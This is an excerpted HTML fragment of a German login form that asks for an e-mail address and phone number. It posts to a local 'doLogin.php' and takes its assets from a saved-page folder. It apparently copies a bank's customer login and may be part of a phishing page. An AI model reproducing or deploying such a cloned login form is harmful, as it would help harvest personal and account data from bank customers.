                                        ...
                                        <div class="login-form" style="margin-left:auto; margin-right:auto">
                                            ...
                                            <div class="login-form-wrapper">
                                                ...
                                                <h3 class="margin-top-no margin-bottom-small">
                                                    Bitte geben Sie unten Ihre Informationen ein
                                                </h3>
...
<div class="ei_appl_ident" id="ident">
    ...
    <form action="doLogin.php" method="post" autocomplete="off" onsubmit="return submitForm()" name="bloc_ident" id="bloc_ident" data-tracked="true">
        <fieldset>
            ...
            <div class="ei_appl_ident_content">
                ...
                <div class="ei_appl_ident_lig">
                    <label for="_userid">E-Mail-Addresse</label>
                    <input type="text" name="_cm_mail" id="_email" value="" placeholder="" class="ei_appl_userid" maxlength="" tabindex="1" data-tracked="true">
                </div>
                <div class="ei_appl_ident_lig">
                    <label for="_userid">Telefonnummer</label>
                    <input type="text" name="_cm_phone" id="_phone" value="" placeholder="" class="ei_appl_userid" maxlength="" tabindex="1" data-tracked="true">
                </div>
        ...
        <div class="ei_appl_ident_blocbts" style="width:87%">
                    ...
                    <input id="login-submit" type="image" alt="Jetzt einloggen" class="ei_btn_typ_send" src="./login_files/seconnecter.png" name="submit" tabindex="4" data-tracked="true">
												                    ...
												                    <div class="login-function-forgot" style="display: none">
                                                                        ...
                                                                        <p class="margin-bottom-small">
                                                                            ...
                                                                            <label><input type="radio" name="ctypeForget" value="2" data-tracked="true"> Gesch�ftskunde</label>
                                                                        </p>
